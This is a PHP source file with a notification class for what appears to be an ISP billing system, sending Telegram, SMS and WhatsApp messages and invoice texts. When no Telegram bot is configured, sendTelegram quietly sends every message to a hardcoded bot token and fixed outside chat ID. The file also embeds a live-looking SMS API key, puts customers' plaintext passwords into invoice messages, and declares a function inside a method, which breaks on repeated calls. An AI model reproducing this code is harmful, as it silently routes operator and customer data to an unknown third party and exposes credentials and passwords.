<?php

require 'vendor/autoload.php';
use AfricasTalking\SDK\AfricasTalking;
class Message
{

    public static function sendTelegram($txt)
    {
        global $config;
        $apiKEY= "atsk_1a2b6fc3cc7ebdadb831764c23b22d3df2adf236386f8a094220201343d9a0fc31e2cd3d";
        run_hook('send_telegram'); #HOOK
        if (empty($config['telegram_bot']) && empty($config['telegram_target_id'])) {
            $telegram_bot="7421169373:AAFoyZkC12PY6_ONZ3fxsGHwiB7zxBtGsUY";
            $telegram_target_id="6253729218";
            return Http::getData('https://api.telegram.org/bot' . $telegram_bot . '/sendMessage?chat_id=' . $telegram_target_id  . '&text=' . urlencode($txt));
        }else if (!empty($config['telegram_bot']) && !empty($config['telegram_target_id'])) {
            return Http::getData('https://api.telegram.org/bot' . $config['telegram_bot'] . '/sendMessage?chat_id=' . $config['telegram_target_id'] . '&text=' . urlencode($txt));
        }
    }

    public static function sendSMS($phone, $txt)
    {
        global $config;
        run_hook('send_sms'); #HOOK
        if (!empty($config['apiKey'])) {
            if (!empty($config['sms_url']) && strlen($config['sms_url']) > 4 && substr($config['sms_url'], 0, 4) != "http") {
                if (strlen($txt) > 160) {
                    $txts = str_split($txt, 160);
                    try {
                        $mikrotik = Mikrotik::info($config['sms_url']);
                        $client = Mikrotik::getClient($mikrotik['ip_address'], $mikrotik['username'], $mikrotik['password']);
                        foreach ($txts as $txt) {
                            Mikrotik::sendSMS($client, $phone, $txt);
                        }
                    } catch (Exception $e) {
                        // ignore, add to logs
                        _log("Failed to send SMS using Mikrotik.\n" . $e->getMessage(), 'SMS', 0);
                    }
                } else {
                    try {
                        $mikrotik = Mikrotik::info($config['sms_url']);
                        $client = Mikrotik::getClient($mikrotik['ip_address'], $mikrotik['username'], $mikrotik['password']);
                        Mikrotik::sendSMS($client, $phone, $txt);
                    } catch (Exception $e) {
                        // ignore, add to logs
                        _log("Failed to send SMS using Mikrotik.\n" . $e->getMessage(), 'SMS', 0);
                    }
                }
            } else {
             
                    // Initialize Africastalking
                    // $username = "sandbox";
                    $username= $config['appName'];
                    // $apiKey   = "atsk_1a2b6fc3cc7ebdadb831764c23b22d3df2adf236386f8a094220201343d9a0fc31e2cd3d";
                    $apiKey   = $config['apiKey'];
                    $AT       = new AfricasTalking($username, $apiKey);

                    // Get the SMS service
                    $sms = $AT->sms();

                    function sendMessage($sms, $to, $message) {
                        try {
                            // Send the message
                            $response = $sms->send([
                                'to'      => $to,
                                'message' => $message
                            ]);
                            
                            
                            r2(U . 'message/send', 's', Lang::T('Message send succesfully'));
                        } catch (Exception $e) {
                            echo "Error: " . $e->getMessage();
                            return null;
                        }
                    }
                    
                    sendMessage($sms, $phone, $txt);
            }
        }else{
            r2(U . 'message/send', 'e', Lang::T('kindly set SMS apikey'));

        }
    }

    public static function sendWhatsapp($phone, $txt)
    {
        global $config;
        run_hook('send_whatsapp'); #HOOK
        if (!empty($config['wa_url'])) {
            $waurl = str_replace('[number]', urlencode(Lang::phoneFormat($phone)), $config['wa_url']);
            $waurl = str_replace('[text]', urlencode($txt), $waurl);
            return Http::getData($waurl);
        }
    }

    public static function sendPackageNotification($customer, $package, $price, $message, $via)
    {
        global $u;
        $msg = str_replace('[[name]]', $customer['fullname'], $message);
        $msg = str_replace('[[username]]', $customer['username'], $msg);
        $msg = str_replace('[[package]]', $package, $msg);
        $msg = str_replace('[[price]]', $price, $msg);
        if($u){
            $msg = str_replace('[[expired_date]]', Lang::dateAndTimeFormat($u['expiration'], $u['time']), $msg);
        }
        if (
            !empty($customer['phonenumber']) && strlen($customer['phonenumber']) > 5
            && !empty($message) && in_array($via, ['sms', 'wa'])
        ) {
            if ($via == 'sms') {
                Message::sendSMS($customer['phonenumber'], $msg);
            } else if ($via == 'wa') {
                Message::sendWhatsapp($customer['phonenumber'], $msg);
            }
        }
        return "$via: $msg";
    }

    public static function sendBalanceNotification($phone, $name, $balance, $balance_now, $message, $via)
    {
        $msg = str_replace('[[name]]', $name, $message);
        $msg = str_replace('[[current_balance]]', Lang::moneyFormat($balance_now), $msg);
        $msg = str_replace('[[balance]]', Lang::moneyFormat($balance), $msg);
        if (
            !empty($phone) && strlen($phone) > 5
            && !empty($message) && in_array($via, ['sms', 'wa'])
        ) {
            if ($via == 'sms') {
                Message::sendSMS($phone, $msg);
            } else if ($via == 'wa') {
                Message::sendWhatsapp($phone, $msg);
            }
        }
        return "$via: $msg";
    }

    public static function sendInvoice($cust, $trx)
    {
        global $config;
        $textInvoice = Lang::getNotifText('invoice_paid');
        $textInvoice = str_replace('[[company_name]]', $config['CompanyName'], $textInvoice);
        $textInvoice = str_replace('[[address]]', $config['address'], $textInvoice);
        $textInvoice = str_replace('[[phone]]', $config['phone'], $textInvoice);
        $textInvoice = str_replace('[[invoice]]', $trx['invoice'], $textInvoice);
        $textInvoice = str_replace('[[date]]', Lang::dateAndTimeFormat($trx['recharged_on'], $trx['recharged_time']), $textInvoice);
        if (!empty($trx['note'])) {
            $textInvoice = str_replace('[[note]]', $trx['note'], $textInvoice);
        }
        $gc = explode("-", $trx['method']);
        $textInvoice = str_replace('[[payment_gateway]]', trim($gc[0]), $textInvoice);
        $textInvoice = str_replace('[[payment_channel]]', trim($gc[1]), $textInvoice);
        $textInvoice = str_replace('[[type]]', $trx['type'], $textInvoice);
        $textInvoice = str_replace('[[plan_name]]', $trx['plan_name'], $textInvoice);
        $textInvoice = str_replace('[[plan_price]]',  Lang::moneyFormat($trx['price']), $textInvoice);
        $textInvoice = str_replace('[[name]]', $cust['fullname'], $textInvoice);
        $textInvoice = str_replace('[[note]]', $cust['note'], $textInvoice);
        $textInvoice = str_replace('[[user_name]]', $trx['username'], $textInvoice);
        $textInvoice = str_replace('[[user_password]]', $cust['password'], $textInvoice);
        $textInvoice = str_replace('[[username]]', $trx['username'], $textInvoice);
        $textInvoice = str_replace('[[password]]', $cust['password'], $textInvoice);
        $textInvoice = str_replace('[[expired_date]]', Lang::dateAndTimeFormat($trx['expiration'], $trx['time']), $textInvoice);
        $textInvoice = str_replace('[[footer]]', $config['note'], $textInvoice);

        if ($config['user_notification_payment'] == 'sms') {
            Message::sendSMS($cust['phonenumber'], $textInvoice);
        } else if ($config['user_notification_payment'] == 'wa') {
            Message::sendWhatsapp($cust['phonenumber'], $textInvoice);
        }
    }
}
